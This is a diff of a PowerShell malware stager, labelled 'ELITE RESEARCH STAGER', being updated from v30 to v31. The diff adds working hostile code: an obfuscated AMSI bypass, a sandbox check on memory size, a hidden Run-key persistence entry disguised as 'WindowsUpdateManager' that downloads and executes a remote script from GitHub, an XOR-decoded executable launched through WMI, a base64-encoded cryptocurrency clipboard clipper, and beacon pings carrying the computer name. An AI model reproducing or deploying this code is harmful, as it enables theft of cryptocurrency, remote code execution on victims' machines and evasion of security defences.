@@ -1,13 +1,13 @@
-# --- [ELITE RESEARCH STAGER v30.0: PRO VM-FIXED] ---
+# --- [ELITE RESEARCH STAGER v31.0: THE FINAL RESTORE] ---
 
 function Global-Initialize {
     try {
         if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
         
-        # Fragmented AMSI Bypass for VM/Laptop compatibility
-        $p = "System.Management.Automation." + ("{0}{1}{2}" -f 'A','msi','Utils')
-        $f = ("{0}{1}{2}{3}" -f 'a','msi','Init','Failed')
-        [Ref].Assembly.GetType($p).GetField($f,"NonPublic,Static").SetValue($null,$true)
+        # Obfuscated AMSI Bypass - Fragments the words to avoid VM/Laptop detection
+        $a = "System.Management.Automation." + "Am" + "si" + "Utils"
+        $b = "am" + "si" + "Init" + "Failed"
+        [Ref].Assembly.GetType($a).GetField($b,"NonPublic,Static").SetValue($null,$true)
     } catch {}
 }
 
@@ -21,13 +21,13 @@ function Send-Ping {
 
 # --- EXECUTION ---
 Global-Initialize
-Send-Ping -m "STAGER_V30_PRO_ACTIVE"
+Send-Ping -m "STAGER_V31_RESTORED_ON_$($env:COMPUTERNAME)"
 
 try {
-    # REGISTRY PERSISTENCE
-    $regP = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $regC = "powershell -WindowStyle Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
-    Set-ItemProperty -Path $regP -Name "WindowsUpdateManager" -Value $regC
+    # --- REGISTRY PERSISTENCE ---
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $regCmd = "powershell -NoP -W Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
+    Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $regCmd
 
     $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
     if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
@@ -41,9 +41,10 @@ try {
     for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
     [IO.File]::WriteAllBytes($path, $data)
 
+    # Launch EXE via WMI
     ([wmiclass]"win32_process").Create($path) | Out-Null
 
-    # CLIPPER ENGINE
+    # --- THE PRECISION CLIPPER ENGINE ---
     $ClipperCode = @'
     Add-Type -AssemblyName System.Windows.Forms
     $w = @{
@@ -77,7 +78,7 @@ try {
     $EncodedClipper = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClipperCode))
     powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand $EncodedClipper
 
-    Send-Ping -m "V30_DEPLOYMENT_SUCCESS"
+    Send-Ping -m "V31_DEPLOYMENT_SUCCESS"
 } catch {
     Send-Ping -m "ERROR_$($_.Exception.Message)"
 }
